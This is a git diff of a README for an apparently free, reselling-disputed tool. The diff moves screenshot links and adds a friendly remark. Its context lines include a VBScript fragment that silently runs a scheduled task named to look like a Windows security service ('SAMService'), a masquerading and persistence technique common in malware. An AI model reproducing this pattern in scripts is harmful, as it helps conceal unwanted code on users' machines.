@@ -16,7 +16,8 @@ Who is selling what actually?? Dude it's FREE here and always will be now do som
 Damn dude how low you can go?
 
 
-
+![resim](https://user-images.githubusercontent.com/103955692/163860298-2adb53c3-f030-43ad-8b0b-66f84201a688.png)
+![resim](https://user-images.githubusercontent.com/103955692/163860309-780b3942-cd64-4cec-bb43-931416d5993b.png)
 
 ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 
@@ -28,6 +29,7 @@ IF one manage to compile it without issues feel free to contact me if not go bac
 
 ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 
+![resim](https://user-images.githubusercontent.com/103955692/163860330-fb515385-55ec-4846-9e17-71684636f900.png)
 
 ![Screenshot_1](https://user-images.githubusercontent.com/1867768/164581897-d8b3750c-90e5-49b2-9ea5-35bd7f3d9f98.png)
 
@@ -58,8 +60,7 @@ Wscript.Sleep(2000)
 o.run "schtasks /run /tn " & chr(34) & "Microsoft\Windows\Security\SAMService" & chr(34),0,0
 ```
 
-![resim](https://user-images.githubusercontent.com/103955692/163860298-2adb53c3-f030-43ad-8b0b-66f84201a688.png)
-![resim](https://user-images.githubusercontent.com/103955692/163860309-780b3942-cd64-4cec-bb43-931416d5993b.png)
-![resim](https://user-images.githubusercontent.com/103955692/163860330-fb515385-55ec-4846-9e17-71684636f900.png)
+Keep up the good work ^^
+
 
 **https://www.pantheon.one/**
